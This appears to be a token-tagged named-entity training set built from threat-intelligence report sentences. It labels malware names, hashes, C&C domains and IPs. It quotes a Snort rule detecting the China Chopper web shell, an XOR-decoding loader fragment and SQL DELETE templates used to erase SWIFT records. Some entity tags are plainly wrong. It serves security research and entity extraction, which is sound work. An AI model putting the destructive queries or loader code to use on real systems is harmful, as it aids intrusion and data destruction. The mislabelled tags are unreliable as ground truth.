the	O
base64	O
data	O
is	O
subjected	O
to	O
some	O
substitutions	O
before	O
it	O
is	O
sent	O
out	O
preventing	O
run	O
of	O
the	O
mill	O
inspection	O
on	O
the	O
wire	O
.	O

Extracting	O
Intelligence	O

The	O
Ghost	O
Dragon	O
group	O
modified	O
the	O
source	O
code	O
and	O
changed	O
the	O
packet	O
flag	O
to	O
'	O
XYTvn	O
'	O
,	O
as	O
seen	O
in	O
Figure	O
4	O
.	O

It	O
then	O
adds	O
the	O
'	O
Loveusd.sys	O
'	O
extracted	O
driver	O
name	O
to	O
the	O
upper	O
filter	O
list	O
.	O

1	O
*	O
Mozilla	O
/4.0	O

Sure	O
enough	O
,	O
the	O
encryption	O
routine	O
,	O
Encrypt_sub_44C34C	O
(	O
)	O
,	O
is	O
functionally	O
identical	O
to	O
the	O
decryption	O
routine	O
,	O
as	O
hoped	O
and	O
expected	O
;	O
the	O
only	O
difference	O
being	O
that	O
the	O
Integerize_sub_44C1C0	O
(	O
)	O
routine	O
prior	O
to	O
decryption	O
is	O
absent	O
,	O
and	O
a	O
new	O
routine	O
,	O
which	O
we	O
'll	O
call	O
Integer2String_sub_409C6C	O
(	O
)	O
,	O
is	O
called	O
following	O
the	O
encryption	O
step	O
;	O
this	O
routine	O
simply	O
converts	O
the	O
raw	O
encrypted	O
data	O
back	O
into	O
the	O
ASCII	O
version	O
of	O
its	O
hexadecimal	O
values	O
.	O

But	O
this	O
time	O
,	O
perhaps	O
for	O
the	O
first	O
time	O
,	O
root9B	O
has	O
managed	O
to	O
find	O
where	O
they	O
were	O
hiding	O
and	O
identified	O
effective	O
defenses	O
against	O
their	O
intended	O
attacks	O
.	O

Using	O
Cisco	O
AnyConnect	O
software	O
as	O
a	O
lure	O
continues	O
a	O
pattern	O
of	O
using	O
typical	O
corporate	O
software	O
as	O
a	O
vehicle	O
to	O
infect	O
victim	O
machines	O
.	O

[	O
O.N.Mishin@chelindbank[.]ru	O
]	O
Transfer	O
error	O
,	O
kindly	O
reverse	O
to	O
us	O
.	O

Overview	O
of	O
the	O
Malicious	O
Email	O
s	O
In	O
the	O
The	O
first	O
wave	O
of	O
attack	O
,	O
The	O
attackers	O
spoofed	O
an	O
email	O
id	O
that	O
is	O
associated	O
with	O
Indian	O
Ministry	O
of	O
Home	O
Affairs	O
(	O
MHA	O
)	O
and	O
an	O
email	O
was	O
sent	O
on	O
September	O
20th	O
,	O
2016	O
(	O
just	O
2	O
days	O
after	O
the	O
Uri	O
terror	O
attack	O
)	O
to	O
an	O
email	O
id	O
associated	O
with	O
the	O
Indian	O
Embassy	O
in	O
Japan	O
.	O

The	O
remote	O
controller	O
provides	O
a	O
user	O
interface	O
that	O
allows	O
attackers	O
to	O
send	O
jobs	O
to	O
any	O
compromised	O
endpoint	O
.	O

What	O
Bunny	B-malware.unknown
,	O
Babar	B-malware.drop
and	O
NBOT	B-malware.unknown
all	O
have	O
in	O
common	O
though	O
is	O
that	O
the	O
obfuscation	O
technique	O
is	O
easy	O
to	O
break	O
and	O
only	O
applied	O
to	O
a	O
subset	O
of	O
APIs	O
.	O

Shear	O
,	O
Michael	O
D	O
.	O

As	O
seen	O
in	O
Figure	O
7	O
,	O
these	O
files	O
are	O
:	O
car.dat	O
(	O
randomly	O
generated	O
name	O
given	O
to	O
Windows	O
tool	O
)	O
i4.dt	O
(	O
VBS	O
script	O
that	O
downloads	O
the	O
same	O
zip	O
file	O
)	O
id	O
(	O
ID	O
given	O
to	O
host	O
)	O
cryptui.dll	O
(	O
malicious	O
Trojan	O
)	O
cryptui.dll	O
(	O
malicious	O
Trojan	O
)	O

Simultaneously	O
orchestrating	O
multiple	O
APT	O
campaigns	O
of	O
such	O
magnitude	O
and	O
sophistication	O
takes	O
time	O
,	O
financial	O
resources	O
and	O
a	O
large	O
team	O
who	O
can	O
support	O
it	O
.	O

0F5DAB3EB308	O

The	O
main	O
purpose	O
of	O
the	O
IGT	O
tool	O
is	O
to	O
make	O
an	O
inventory	O
of	O
the	O
system	O
,	O
saving	O
information	O
from	O
the	O
network	O
interfaces	O
and	O
addresses	O
,	O
credentials	O
belonging	O
to	O
the	O
Domain	O
and	O
database	O
server	O
,	O
services	O
being	O
run	O
from	O
the	O
OS	O
and	O
everything	O
that	O
could	O
help	O
the	O
Poseidon	B-malware.infosteal
Group	O
make	O
its	O
attack	O
more	O
customized	O
to	O
its	O
victim	O
.	O

The	O
following	O
are	O
examples	O
of	O
Mimikatz	B-malware.unknown
command	O
line	O
arguments	O
detected	O
during	O
the	O
attack	O
:	O
The	O
stolen	O
credentials	O
were	O
used	O
to	O
infect	O
more	O
machines	O
,	O
leveraging	O
Windows	O
built-in	O
tools	O
as	O
well	O
as	O
pass-the-ticket	O
and	O
pass-the-hash	O
attacks	O
.	O

APT28	B-malware.infosteal
sends	O
spear	O
phishing	O
emails	O
to	O
WADA	O
employees	O
.	O

Ch	O
3.25	O
:	O
ec7e3cfaeaac0401316d66e964be684e	B-hash
Ch	O
3.26	O
:	O
b407b6e5b4046da226d6e189a67f62ca	B-hash
Code	O
similarity	O
:	O
95	O
%	O
The	O
version	O
3.26	O
is	O
the	O
latest	O
known	O
version	O
.	O

After	O
finalizing	O
the	O
analysis	O
of	O
the	O
Android	O
malware	O
,	O
Cyberkov	O
uploaded	O
it	O
to	O
VirusTotal	O
to	O
see	O
if	O
it	O
has	O
been	O
uploaded	O
before	O
and	O
what	O
information	O
we	O
can	O
get	O
from	O
it	O
:	O
Cyberkov	O
discovered	O
that	O
the	O
malware	O
has	O
not	O
been	O
uploaded	O
to	O
VirusTotal	O
before	O
and	O
the	O
first	O
sample	O
of	O
this	O
malware	O
has	O
been	O
uploaded	O
by	O
us	O
.	O

We	O
found	O
this	O
group	O
running	O
HTRAN	O
on	O
one	O
of	O
their	O
front-end	O
command	O
and	O
control	O
servers	O
.	O

However	O
,	O
this	O
looks	O
to	O
be	O
a	O
small	O
part	O
of	O
its	O
activity	O
.	O

The	O
image	O
is	O
taken	O
from	O
a	O
news	O
story	O
about	O
Abbas	O
speaking	O
at	O
a	O
meeting	O
in	O
Ramallah	O
.	O

This	O
is	O
the	O
same	O
IP	O
address	O
that	O
was	O
cited	O
in	O
iSight	O
's	O
reporting	O
of	O
the	O
Forbes	O
breach	O
.	O

That	O
's	O
why	O
the	O
malware	O
went	O
out	O
of	O
control	O
.	O

The	O
memory	O
segment	O
was	O
dumped	O
to	O
disk	O
for	O
further	O
analysis	O
.	O

Finally	O
,	O
this	O
report	O
offers	O
a	O
rare	O
glimpse	O
into	O
what	O
a	O
cyber	O
espionage	O
APT	O
looks	O
like	O
'	O
under-the-hood	O
'	O
.	O

However	O
,	O
the	O
subsequent	O
Diskcoder.C	O
outbreak	O
suggests	O
that	O
the	O
attackers	O
had	O
access	O
to	O
the	O
update	O
server	O
of	O
the	O
legitimate	O
software	O
.	O

This	O
code	O
concatenates	O
the	O
three	O
components	O
of	O
the	O
final	O
crypto	O
key	O
:	O
the	O
hard-coded	O
prefix	O
(	O
e.g.	O
,	O
#	O
KCMDDC42F	O
#	O
-	O
)	O
,	O
the	O
three-digit	O
string	O
890	O
that	O
is	O
not	O
technically	O
hard-coded	O
but	O
deterministically	O
computed	O
using	O
the	O
aforementioned	O

Assuming	O
Lazarus	O
are	O
indeed	O
back	O
to	O
targeting	O
bank	O
payment	O
systems	O
,	O
this	O
will	O
serve	O
to	O
emphasize	O
the	O
importance	O
of	O
network	O
hardening	O
and	O
controls	O
frameworks	O
being	O
pushed	O
by	O
the	O
industry	O
at	O
present	O
.	O

Many	O
targets	O
are	O
located	O
in	O
the	O
self-declared	O
separatist	O
states	O
of	O
Donetsk	O
and	O
Luhansk	O
,	O
which	O
have	O
been	O
classified	O
as	O
terrorist	O
organizations	O
by	O
the	O
Ukrainian	O
government	O
.	O

It	O
should	O
be	O
pointed	O
out	O
that	O
conceptually	O
,	O
this	O
decryption	O
mechanism	O
-	O
both	O
the	O
manner	O
in	O
which	O
the	O
substitution	O
table	O
is	O
built	O
,	O
as	O
well	O
as	O
how	O
it	O
is	O
used	O
for	O
XOR	O
-based	O
decryption	O
-	O
is	O
very	O
similar	O
to	O
that	O
used	O
by	O
the	O
Trojan.PonyDOS	B-malware.unknown
malware	O
family	O
.	O

All	O
rights	O
reserved	O
.	O

Figure	O
5	O
:	O
Contents	O
of	O
Decoded	O
VBS	O
Figure	O
6	O
:	O
More	O
Contents	O
of	O
Decoded	O
VBS	O

This	O
particular	O
RAT	B-malware.backdoor
employs	O
simple	O
and	O
cunning	O
techniques	O
to	O
prevent	O
its	O
discovery	O
or	O
further	O
investigation	O
.	O

The	O
purpose	O
of	O
the	O
'	O
Local	O
'	O
field	O
remains	O
unclear	O
(	O
the	O
other	O
possible	O
value	O
being	O
'	O
­l	O
'	O
)	O
.	O

alert	O
tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HTTP_SERVERS	O
$	O
HTTP_PORTS	O
(	O
msg	O
:	O
'	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
with	O
all	O
Commands	O
Detected	O
'	O
;	O
flow	O
:	O
to_	O
server	O
,	O
established	O
;	O
content	O
:	O
'	O
FromBase64String	O
'	O
;	O
content	O
:	O
'	O
z	O
'	O
;	O
pcre	O
:	O
'	O
/Z\d	O
{	O
1,3	O
}	O
/i	O
'	O
;	O
content	O
:	O
'	O
POST	O
'	O
;	O
nocase	O
;	O
http_method	O
;	O
reference	B-url.unknown
:	I-url.unknown
url	I-url.unknown
,	I-url.unknown
http://www.fireeye.com/blog/technical/botnet-activities-research/2013/08/	I-url.unknown
breaking-down-the-china-chopper-web-shell-part-i.html	O
;	O
classtype	O
:	O
web-application-attack	O
;	O
sid	O
:	O
900000102	O
;	O
)	O

2.2.1	O
.	O

The	O
update.msi-file	O
stores	O
data	O
collected	O
by	O
the	O
keylogging	O
module	O
.	O

Resources	O
include	O
discussion	O
points	O
,	O
steps	O
to	O
start	O
evaluating	O
a	O
cybersecurity	O
program	O
,	O
and	O
a	O
list	O
of	O
hands-on	O
resources	O
available	O
to	O
organizations	O
.	O

By	O
2017	O
,	O
North	O
Korean	O
actors	O
had	O
jumped	O
on	O
the	O
cryptocurrency	O
bandwagon	O
.	O

During	O
testing	O
it	O
was	O
found	O
that	O
the	O
last	O
hit	O
was	O
normally	O
the	O
correct	O
VBR	O
,	O
as	O
this	O
would	O
be	O
the	O
VBR	O
found	O
at	O
the	O
end	O
of	O
the	O
volume	O
.	O

Spawning	O
arbitrary	O
processes	O
.	O

There	O
is	O
clearly	O
a	O
need	O
for	O
more	O
advanced	O
analytical	O
systems	O
to	O
identify	O
campaigns	O
and	O
link	O
the	O
samples	O
together	O
.	O

At	O
first	O
glance	O
,	O
it	O
looks	O
as	O
if	O
like	O
the	O
main	O
function	O
does	O
nothing	O
malicious	O
,	O
but	O
in	O
fact	O
it	O
replaces	O
the	O
.text	O
section	O
of	O
the	O
legitimate	O
mcoemcpy.exe	O
,	O
a	O
side-loaded	O
binary	O
.	O

Then	O
,	O
issue	O
the	O
dir	O
command	O
and	O
display	O
results	O
to	O
user	O
.	O

그러나	O
이들	O
악성코드가	O
실제	O
공격에	O
사용되었는지는	O
확인되	O
지	O
않았다	O
.	O

Then	O
create	O
a	O
service	O
called	O
'	O
helpsvc	O
'	O
pointing	O
back	O
to	O
Iron	O
Backdoor	O
dll	O
.	O

These	O
executable	O
files	O
are	O
lite	O
droppers	O
,	O
maintaining	O
these	O
decoy	O
jpeg	O
files	O
,	O
and	O
code	O
to	O
create	O
an	O
lnk	O
downloader	O
.	O

All	O
rights	O
reserved	O
.	O

The	O
basic	O
information	O
reported	O
back	O
by	O
the	O
malware	O
would	O
also	O
certainly	O
allow	O
the	O
attacker	O
a	O
way	O
to	O
triage	O
infections	O
to	O
ensure	O
they	O
had	O
reached	O
their	O
intended	O
victim	O
rather	O
than	O
a	O
researcher	O
.	O

'	O
Foundation	O
Board	O
Media	O
Release	O
:	O
WADA	O
Strengthens	O
Anti-Doping	O
Worldwide	O
.	O
'	O

A	O
previous	O
,	O
removed	O
,	O
report	O
from	O
another	O
vendor	O
claimed	O
non-specific	O
information	O
about	O
the	O
groups	O
'	O
interest	O
in	O
Chinese	O
universities	O
,	O
but	O
that	O
report	O
has	O
been	O
removed	O
–	O
most	O
likely	O
detections	O
were	O
related	O
to	O
students	O
'	O
and	O
researchers	O
'	O
scanning	O
known	O
collected	O
samples	O
and	O
any	O
'	O
incidents	O
'	O
remain	O
unconfirmed	O
and	O
unknown	O
.	O

These	O
cyber	O
operations	O
have	O
included	O
spearphishing	O
campaigns	O
targeting	O
government	O
organizations	O
,	O
critical	O
infrastructure	O
entities	O
,	O
think	O
tanks	O
,	O
universities	O
,	O
political	O
organizations	O
,	O
and	O
corporations	O
leading	O
to	O
the	O
theft	O
of	O
information	O
.	O

DWORD1	O
==	O
~DWORD0	O
DWORD2	O
==	O
ROR	O
(	O
DWORD0	O
,	O
7	O
)	O

By	O
dropping	O
the	O
ntshrui.DLL	O
in	O
the	O
directory	O
C	O
:	O
\Windows	O
,	O
the	O
malware	O
achieves	O
persistence	O
.	O

Unlike	O
what	O
is	O
generally	O
expected	O
from	O
a	O
C	O
&	O
C	O
,	O
browsing	O
the	O
websites	O
actually	O
returns	O
the	O
following	O
response	O
:	O
Websites	O
related	O
to	O
this	O
campaign	O
use	O
readymade	O
bootstrap	O
templates	O
,	O
but	O
include	O
unique	O
and	O
grammatically	O
incorrect	O
strings	O
such	O
as	O
'	O
Probably	O
the	O
most	O
Music	O
Site	O
in	O
the	O
world	O
!	O

PCC_PROXY	O
:	O
:ReadWaitingData	O
member	O
functions	O
.	O

The	O
malware	O
in	O
this	O
campaign	O
utilizes	O
a	O
known	O
Ghostscript	O
exploit	O
(	O
CVE-2017-8291—	B-malware.infosteal
Intel	I-malware.infosteal
Card	I-malware.infosteal
)	O
and	O
is	O
tailored	O
to	O
target	O
only	O
users	O
of	O
a	O
Korean	O
language	O
word	O
processor	O
,	O
Hancom	O
's	O
Hangul	O
Word	O
Processor	O
.	O

We	O
have	O
to	O
remind	O
all	O
relevant	O
parties	O
that	O
we	O
are	O
confronting	O
with	O
the	O
risk	O
of	O
large	O
scale	O
diffusion	O
of	O
network	O
armaments	O
which	O
is	O
led	O
by	O
the	O
low	O
cost	O
of	O
the	O
attack	O
capability	O
.	O

The	O
most	O
important	O
functionalities	O
offered	O
by	O
the	O
main	O
component	O
are	O
establishment	O
of	O
persistence	O
,	O
gathering	O
of	O
basic	O
system	O
information	O
,	O
communication	O
with	O
the	O
C	O
&	O
C	O
server	O
and	O
the	O
execution	O
of	O
additional	O
tasks	O
,	O
modules	O
or	O
executables	O
as	O
commanded	O
by	O
the	O
C	O
&	O
C	O
server	O
.	O

https://play.google.com/store/apps/details?id=org.moayyad.aye.flash.app&hl=en	B-url.normal
https://www.youtube.com/user/1quds/feed	B-url.normal

FVEAPI.dll	O

byte	O
[	O
]	O
array	O
=	O
new	O
byte	O
[	O
]	O
115,120,127,112,99,104,99,116,112,117	O
,	O
116,99,63,84,105,97,125,126,120,101	O
this.InitializeComponent	O
(	O
)	O
;	O
for	O
(	O
int	O
i	O
=	O
0	O
;	O
i	O
<	O
array.Length	O
;	O
i++	O
)	O
array	O
[	O
i	O
]	O
^=	O
17	O
;	O
if	O
(	O
args.get_InitParams	O
(	O
)	O
.get_Keys	O
(	O
)	O
.Contains	O
(	O
'	O
shell32	O
'	O
)	O
)	O
type.InvokeMember	O
(	O
'	O
run	O
'	O
,	O
256	O
,	O
null	O
,	O
obj	O
,	O
new	O
object	O
[	O
]	O
)	O

Trilog.exe	O
took	O
one	O
option	O
from	O
the	O
command	O
line	O
,	O
which	O
was	O
a	O
single	O
IP	O
address	O
of	O
the	O
target	O
Triconex	B-malware.unknown
device	O
.	O

However	O
,	O
we	O
can	O
notice	O
the	O
following	O
:	O
The	O
configuration	O
file	O
(	O
XML	O
)	O
in	O
version	O
1.5	O
is	O
stored	O
in	O
Unicode	O
and	O
not	O
in	O
ASCII	O
anymore	O
;	O
The	O
two	O
versions	O
implement	O
a	O
mechanism	O
to	O
infect	O
new	O
media	O
connected	O
to	O
the	O
infected	O
system	O
.	O

Here	O
is	O
the	O
resemblance	O
ratio	O
for	O
each	O
version	O
,	O
comparing	O
direct	O
neighbor	O
versions	O
only	O
,	O
created	O
using	O
BinDiff	O
:	O
The	O
biggest	O
code	O
update	O
has	O
occurred	O
between	O
version	O
2.14.1	O
and	O
version	O
3.00	O
.	O

Chien	O
,	O
'	O
Stuxnet	B-malware.backdoor
0.5	O
:	O
The	O
Missing	O
Link	O
,	O
'	O
Symantec	O
Security	O
Response	O
[	O
online	O
]	O
26	O
February	O
2013	O
,	O
Available	O
:	O
http://www.symantec.com/content/en/us/enterprise/media/security_respo	B-url.normal
nse/whitepapers/stuxnet_0_5_the_missing_link.pdf	I-url.normal
N.	O
Falliere	O
,	O
L.	O
O.	O
Murchu	O
,	O
and	O
E	O
.	O

Size	O
of	O
internal	O
buffer	O
<	O
%	O
d	O
>	O
=xFFC	O
(	O
4092	O
)	O
Hardcoded	O
0xA0	O
<	O
%	O
c	O
>	O
=	O
xA0	O
Backdoor	O
identifier	O
1	O
<	O
%	O
s	O
>	O
=	O
'	O
RB0318	O
'	O
Host	O
IP	O
Host	O
port	O
OS	O
version	O
Hostname	O
User	O
name	O
<	O
%	O
s	O
>	O
=	O
'	O
111.222.123.132	O
'	O
<	O
%	O
d	O
>	O
=	O
432	O
(	O
1074	O
.	O
)	O

The	O
outer	O
layer	O
is	O
an	O
encrypted	O
HTTPS	O
via	O
an	O
SSL/TLS	O
connection	O
using	O
the	O
Windows	O
'	O
standard	O
SSL/TLS	O
libraries	O
.	O

0491f4e55158d745fd1653950c89fcc9b37d3c1102680bd3ce67616a36bb2592	B-hash
06529ac1d3388732ebca75b8ee0adf0bc7f45d4c448ec98223dd7a258a0f1f33	B-hash
1192b5111f7c75417215a1285a20147f5ab085368fa95d74e7603d26736057ac	B-hash
1192b5111f7c75417215a1285a20147f5ab085368fa95d74e7603d26736057ac	B-hash
1e3966e77ad1cbf3e3ef76803fbf92300b2b88af39650a1208520e0cdc05645b	B-hash
2431ff8ba00923a9c115a57e541d9d20e0a68b6cb1b48b87e7797864cf07dfab	B-hash
345773dc4215c8c189d21536755614ca7b89082b96563239e363dd72c0cd8c68	B-hash
373231f5be17e09e4ce94f76b35e5be57c961d6c8a9286b2e20e203d53b3c9dd	B-hash
39802d53ae4a29c528626b0870872040dc5c994fb3b6b9e4a3b982144ad56e6c	B-hash
40d30bc2db27e2a8a12cdeb5aae19f04064e5a1775bd3e6cf61a7070b797d3b3	B-hash
40e9c694901aeb27993a8cd81f872076ee430e151f64af06993eb79442103ef8	B-hash
4730c6033d8644c0aae46003bab3254e4beb62187573ffb5ba5bc95a28ddcd93	B-hash
4f1923485e8cdd052467d335a6384f93cd1d50b5d927aea471e56290be29ffa3	B-hash
576ca2b0c5fe1c756c245cb82d6a2ecce7f6976d5c3f3b338f686e06955032cb	B-hash
5e322d208d61dcbf17914e24103710c52878e8cf50957f3d336736f4a1851951	B-hash
652ec150db9a191942807ee5cf4772e75dfac562739477eacc6655fbec880ad7	B-hash
65af112ce229ad888bf4bbba1e3dba701e0e68c9caf81543bb395a8b8192ba8e	B-hash
6eea4a67305f67cc7c016256e93eb816de32b6e9ad700f75828be9f97c28c0e0	B-hash
75ee00a36d324a89fc9ef4d7dbe606b885ec072388ef7b55d39112af7dbca665	B-hash
75f51845de4d0deae8aaab737a71bb8aed14bfa4919712bcdea212f62b70c07f	B-hash
778a01389b17a8ff20c445e0856b3704ac50844faa8d36c01e0ff02518e4c6d3	B-hash
8c33b645e6362ab7e8c8a9989715193b4c9655fd576812218f3957c3fff8c429	B-hash
8d054753e0ed754398835bed794ba4fae64a2efb018f98d3c61064de8aaa231d	B-hash
91d251b11c59b5e25e0c1ae55421893fce8f180a97e2eef88122c61e8cdf1bae	B-hash
926a0196e4a72ed6eb20b51953cc17e8856ea9c0ef554681b7d7f0ecad870a2e	B-hash
926a0196e4a72ed6eb20b51953cc17e8856ea9c0ef554681b7d7f0ecad870a2e	B-hash
99e699e358be9e59cfad6124f44a96d3d1577edf9767afe17281adb37d901e22	B-hash
a91c2cad20935a85d6eed72ef663254396914811f043018732d29276424a9578	B-hash
ade5bd96bfba79051f8e8ed8fe973edd89e5f1ec6469393967c3ad7519a95650	B-hash
b002e8b6406fbdf3de9bfcb3493e61c8a44b331f53125e8fed9daa351c49fd34	B-hash
d803c4d736bcb247d23735a7160b93c2f3d98de5d432680f5eaf9212f965248c	B-hash
e4381ad27b10d895ad8338ba399221d385653b83b8d5dbd5a32cb86a0c318d44	B-hash
eccb3d7d1e8a7cd27c7caf21885c95122eed28361651e8e47b8c02828b232c7e	B-hash
f56c545a3157f1cf753de5ac56bb52e5af42bc6b8225d26aafdce3b430287f34	B-hash
fc49b37b879af6e675f223d324d32c894ba83952b2ee109d52bfa9bd8212e005	B-hash
f9dd8ebb062842798d53e78633ed9ca296f4a93dafb0fe60320a34a3d58d78d4	B-hash

In	O
addition	O
,	O
the	O
.RAR	B-malware.drop
file	O
contains	O
a	O
file	O
in	O
order	O
to	O
change	O
the	O
folder	O
icon	O
into	O
the	O
icon	O
of	O
the	O
Windows	O
thumbnail	O
cache	O
.	O

Verizon	O
Wireless	O
sells	O
ranges	O
of	O
IP	O
addresses	O
to	O
corporate	O
customers	O
,	O
so	O
this	O
is	O
not	O
necessarily	O
an	O
indication	O
that	O
Verizon	O
Wireless	O
itself	O
is	O
operating	O
the	O
server	O
,	O
or	O
that	O
Verizon	O
Wireless	O
customers	O
are	O
being	O
spied	O
on	O
.	O

6939	O
-	O
HURRICANE	O
-	O
Hurricane	O
Electric	O
,	O
Inc	O
.	O

©	O
2016	O
FireEye	O
,	O
Inc	O
.	O

The	O
malware	O
appears	O
on	O
a	O
victim	O
's	O
desktop	O
as	O
'	O
exe.Rajab1.jpg	B-malware.infosteal
'	O
(	O
for	O
example	O
)	O
,	O
along	O
with	O
the	O
default	O
Windows	O
icon	O
for	O
a	O
picture	O
file	O
without	O
thumbnail	O
.	O

Ch	O
2.03	O
:	O
78d3f074b70788897ae7e20e5137bf47	B-hash
Ch	O
2.11	O
:	O
162f415abad9708aa61db8e03bcf2f3c	B-hash
Code	O
similarity	O
:	O
96	O
%	O
The	O
codes	O
of	O
these	O
two	O
versions	O
are	O
extremely	O
similar	O
to	O
each	O
other	O
,	O
we	O
can	O
only	O
notice	O
small	O
changes	O
:	O
The	O
author	O
changed	O
the	O
name	O
of	O
several	O
registry	O
keys	O
(	O
probably	O
to	O
avoid	O
detection	O
by	O
well-known	O
IOC	O
)	O
;	O
The	O
name	O
of	O
two	O
exported	O
functions	O
were	O
modified	O
,	O
too	O
:	O
InstallM	O
(	O
)	O
becomes	O
AddAtomT	O
(	O
)	O
and	O
InstallS	O
(	O
)	O
becomes	O
AddAtomS	O
(	O
)	O
,	O
probably	O
for	O
the	O
same	O
reason	O
than	O
above	O
.	O

After	O
successful	O
authentication	O
,	O
the	O
attacker	O
is	O
provided	O
with	O
the	O
following	O
page	O
:	O
System_web.aspx	B-malware.backdoor
packs	O
a	O
large	O
amount	O
of	O
functionality	O
into	O
a	O
compact	O
interface	O
.	O

The	O
Operation	B-malware.infosteal
Daybreak	I-malware.infosteal
attack	O
employs	O
multiple	O
stages	O
,	O
which	O
are	O
all	O
outstanding	O
in	O
some	O
way	O
.	O

APT12	O
is	O
believed	O
to	O
be	O
a	O
cyber	O
espionage	O
group	O
thought	O
to	O
have	O
links	O
to	O
the	O
Chinese	O
People	O
's	O
Liberation	O
Army	O
.	O

Coverage	O
for	O
known	O
exploits	O
and	O
associated	O
malware	O
is	O
provided	O
as	O
Exploit-Comele	O
,	O
Roarur.dr	O
,	O
and	O
Roarur.dll	O
in	O
the	O
5862	O
DATs	O
,	O
released	O
January	O
15	O
.	O

As	O
in	O
the	O
case	O
of	O
Wannacry	B-malware.unknown
,	O
attribution	O
is	O
very	O
difficult	O
and	O
finding	O
links	O
with	O
previously	O
known	O
malware	O
is	O
challenging	O
.	O

Russian	O
athletes	O
were	O
barred	O
from	O
competing	O
in	O
the	O
Olympic	O
Games	O
.	O

Raphael	O
regularly	O
speaks	O
on	O
security	O
topics	O
and	O
provides	O
red	O
team	O
support	O
to	O
many	O
cyber	O
defense	O
competitions	O
.	O

This	O
cluster	O
relates	O
to	O
the	O
threat	O
actor	O
referred	O
to	O
as	O
Deep	O
Panda	O
by	O
CrowdStrike	O
,	O
as	O
was	O
confirmed	O
in	O
a	O
recent	O
blog	O
post	O
.	O

Additional	O
analysis	O
into	O
other	O
samples	O
is	O
ongoing	O
and	O
more	O
information	O
will	O
be	O
forthcoming	O
.	O

https://plus.google.com/116899857642591292745/posts	B-url.normal
google+	O
https://github.com/rsmudge(	B-url.normal
GitHub	O
)	O
https://www.youtube.com/channel/UCJU2r634VNPeCRug7Y7qdcw	B-url.normal
(	O
youtube	O
)	O
http://www.oldschoolirc.com/	B-url.normal
https://twitter.com/rsmudge	B-url.normal
http://www.hick.org/~raffi/index.html	B-url.normal
http://www.blackhat.com/html/bh-us-12/speakers/Raphael-Mudge.html	B-url.normal
http://www.linkedin.com/in/rsmudge	B-url.normal
Antiy	O
Labs	O
is	O
a	O
professional	O
next-generation	O
security-testing	O
engine	O
R	O
&	O
D	O
enterprise	O
.	O

Avoiding	O
analysis	O
?	O

When	O
targeting	O
Arab-speaking	O
counties	O
,	O
most	O
targets	O
are	O
in	O
Egypt	O
,	O
Saudi	O
Arabia	O
,	O
The	O
Palestinian	O
authority	O
and	O
United	O
Arab	O
Emirates	O
.	O

5	O
August	O
2016	O
.	O

Update	O
and	O
patch	O
production	O
servers	O
regularly	O
.	O

Here	O
are	O
a	O
few	O
key	O
similarities	O
between	O
the	O
samples	O
:	O
The	O
PE	O
timestamp	O
'	O
2011-07-05	O
08:25:31	O
'	O
of	O
the	O
packer	O
is	O
exactly	O
the	O
same	O
as	O
the	O
Bahraini	O
sample	O
.	O

The	O
malware	O
is	O
able	O
to	O
turn	O
the	O
Android	O
phone	O
into	O
a	O
remote	O
listening	O
bug	O
by	O
opening	O
the	O
Microphone	O
and	O
recording	O
the	O
audio	O
then	O
send	O
it	O
to	O
the	O
C2	O
.	O

Some	O
of	O
C	O
&	O
C	O
servers	O
that	O
we	O
have	O
seen	O
from	O
our	O
accumulated	O
data	O
are	O
as	O
follows	O
:	O
•	O
112.121.182.150	B-ip.unknown
•	O
113.10.246.46	B-ip.unknown
•	O
113.10.190.55	B-ip.unknown
•	O
202.130.112.231	B-ip.unknown
•	O
micoosofts.com	B-url.cncsvr
•	O
qtds1979	B-url.cncsvr
.3322.org	I-url.cncsvr
•	O
qtds1979.gicp.net	B-url.cncsvr
server1.micoosofts.com	B-url.cncsvr
sxl1979.gicp.net	B-url.cncsvr
webmonder.gicp.net	B-url.cncsvr
webposter.gicp.net	B-url.cncsvr
www.yahooip.net	B-url.cncsvr
www.yahooprotect.com	B-url.cncsvr
www.yahooprotect.net	B-url.cncsvr
yacooll.com	B-url.cncsvr
•	O
yahooip.net	B-url.cncsvr
•	O
yahooprotect.com	B-url.cncsvr

The	O
browser	O
process	O
always	O
performs	O
outgoing	O
connections	O
and	O
the	O
firewall	O
should	O
n't	O
block	O
them	O
.	O

This	O
section	O
describes	O
the	O
communications	O
behavior	O
of	O
the	O
malware	O
.	O

In	O
some	O
cases	O
the	O
attackers	O
customise	O
the	O
list	O
,	O
presumably	O
based	O
on	O
the	O
things	O
they	O
're	O
expecting	O
to	O
find	O
.	O

DELETE	O
FROM	O
SAAOWNER.MESG_%s	O
WHERE	O
MESG_S_UMID	O
=	O
'	O
%	O
s	O
'	O
;	O
DELETE	O
FROM	O
SAAOWNER.TEXT_%s	O
WHERE	O
TEXT_S_UMID	O
=	O
'	O
%	O
s	O
'	O
;	O

The	O
analysed	O
sample	O
contained	O
a	O
decoy	O
picture	O
document	O
in	O
the	O
resource	O
section	O
:	O
In	O
August	O
2017	O
,	O
the	O
author	O
of	O
GravityRAT	B-malware.drop
used	O
a	O
new	O
variant	O
of	O
its	O
malware	O
,	O
G3	O
.	O

If	O
this	O
initial	O
connection	O
fails	O
it	O
will	O
revert	O
to	O
the	O
secondary	O
backdoor	O
,	O
which	O
utilizes	O
HTTP	O
GET	O
and	O
POST	O
requests	O
somewhat	O
similar	O
to	O
the	O
ones	O
described	O
above	O
to	O
the	O
internal	O
IP	O
address	O
'	O
192.168.2.26	B-ip.unknown
'	O
.	O

The	O
Lotus	O
Group	O
appears	O
to	O
have	O
a	O
tendency	O
of	O
using	O
similar	O
and	O
even	O
identical	O
names	O
for	O
their	O
payloads	O
(	O
seen	O
in	O
their	O
PowerShell	O
payloads	O
,	O
Denis	B-malware.backdoor
backdoor	O
and	O
fake	O
Flash	O
installers	O
)	O
.	O

0	O
?	O

The	O
locations	O
:	O
For	O
root	O
user	O
path	O
:	O
/Library/CoreMediaIO/Plug-Ins/FCP-DAL/iOSScreenCapture.plugin/Contents/Resources/	O

The	O
code	O
itself	O
is	O
obfuscated	O
using	O
Zendix	O
Klass	O
Master	O
(	O
ZKM	O
)	O
,	O
a	O
commercially-available	O
Java	O
obfuscator	O
.	O

And	O
when	O
specific	O
malware	O
sets	O
are	O
selectively	O
deployed	O
,	O
that	O
may	O
tell	O
us	O
something	O
about	O
how	O
efforts	O
are	O
divided	O
.	O

The	O
parameters	O
sent	O
to	O
the	O
'	O
ap.php	O
'	O
script	O
are	O
randomly	O
generated	O
on	O
each	O
hit	O
,	O
so	O
the	O
second	O
stage	O
payload	O
gets	O
encrypted	O
differently	O
each	O
time	O
.	O

